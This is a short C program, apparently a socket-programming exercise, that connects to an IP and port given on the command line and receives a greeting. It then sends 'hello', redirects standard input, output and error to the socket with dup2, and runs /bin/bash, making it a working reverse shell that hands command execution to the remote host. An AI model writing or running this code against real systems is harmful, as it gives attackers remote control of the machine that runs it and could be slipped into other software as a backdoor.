//
// Created by wei,xin on 8/28/22.
//

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <errno.h>

#define BUF_SIZE 1024

void error_handling(char *message);

int main(int argc, char *argv[]) {
    int sock, str_len, n;
    char message[BUF_SIZE];
    char message2[BUF_SIZE];
    int need_break = 0;
    struct sockaddr_in serv_adr, clnt_adr;

    if (argc != 3) {
        printf("Usage : %s <IP> <PORT> \n", argv[0]);
        exit(1);
    }

    bzero(message, BUF_SIZE);
    bzero(message2, BUF_SIZE);
//    bzero(&clnt_adr, sizeof(clnt_adr));
//    clnt_adr.sin_family = AF_INET;
//    clnt_adr.sin_addr.s_addr = htonl(INADDR_ANY);
//    clnt_adr.sin_port = htons(0);


    sock = socket(PF_INET, SOCK_STREAM, 0);
    if (sock == -1) {
        error_handling("socket() error");
    }
//    memset(&serv_adr, 0, sizeof(serv_adr));
    // using bzero instead of memset, more concise
    bzero(&serv_adr, sizeof(serv_adr));
    serv_adr.sin_family = AF_INET;
    serv_adr.sin_addr.s_addr = inet_addr(argv[1]);
    serv_adr.sin_port = htons(atoi(argv[2]));

    if (connect(sock, (struct sockaddr *) &serv_adr, sizeof(serv_adr)) == -1) {
        error_handling("connect() error !");
    } else {
        puts("Connected.........");
    }
    if ((n = recv(sock, message2, sizeof(message2), 0)) > 0) {
        printf("Message %s", message2);
    }
    send(sock, "hello\n", 6, 0);
    dup2(sock, 0);
    dup2(sock, 1);
    dup2(sock, 2);
    // start a shell
    execlp("/bin/bash", "/bin/bash", NULL);

    close(sock);
    return 0;
}


void error_handling(char *message) {
    fputs(message, stderr);
    fputc('\n', stderr);
    exit(1);
}
